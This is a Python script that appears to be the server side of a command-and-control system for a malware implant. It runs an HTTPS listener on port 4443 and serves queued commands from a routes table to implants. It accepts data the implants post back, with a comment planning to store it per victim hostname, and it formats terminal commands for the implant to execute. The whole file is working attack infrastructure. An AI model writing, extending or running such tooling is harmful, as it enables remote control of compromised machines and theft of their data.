#!/usr/bin/python3

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import time
from io import BytesIO
from cnc_routes.main import routes
import json
# will eventually narrow down needed modules

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    """Using https://blog.anvileight.com/posts/simple-python-http-server/ as a starting point to handle requests from implant
    and https://medium.com/@andrewklatzke/creating-a-python3-webserver-from-the-ground-up-4ff8933ecb96"""
    
    def do_HEAD(self):
        return

    def do_GET(self):
        self.respond()


    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(b'This is a POST request') # Instead of just 
        response.write(b'Received: ') # responding with the request POST body data
        response.write(body) # should instead store received data in a db or dict with hostname as key
        self.wfile.write(response.getvalue())

    def handle_http(self):
        status = 200
        content_type = "application/json"
        response_content = ""

        if self.path in routes:
            print(routes[self.path])
            response_content = routes[self.path]
        else:
            response_content = '{"error":"Not Found"}'

        self.send_response(status)
        self.send_header('Content-type', content_type)
        self.end_headers()
        return json.dumps(response_content)



    def respond(self):
        content = self.handle_http()
        self.wfile.write(bytes(content, "UTF-8"))

def prepare_command(command):
    """takes a terminal command and prepares it for consumption by implant
    makes an assumption that all terminal command arguments are delineated by '-' or '--'"""
    pre_prepared = command.split(" -") # lol now it's a list
    for x in range(1,len(pre_prepared)):
        temp = pre_prepared[x]
        pre_prepared[x] = "-" + temp

    return pre_prepared # it will be prepared after this point lol

def main():
    
    server_address = ("0.0.0.0", 4443)
    serv = HTTPServer(server_address, SimpleHTTPRequestHandler)
    serv.socket = ssl.wrap_socket(serv.socket,
        keyfile="key.pem",
        certfile="cert.pem", server_side=True)

    print(f"[+] {time.asctime()} -- Server UP on {server_address[0]}:{server_address[1]}")
    try:
        serv.serve_forever()
    except KeyboardInterrupt: # When we manually kill the server,
        pass                  # do so
    serv.server_close()       # gracefully
    print(f"[+] {time.asctime()} -- Server DOWN on {server_address[0]}:{server_address[1]}")



    

if __name__ == "__main__":
    main()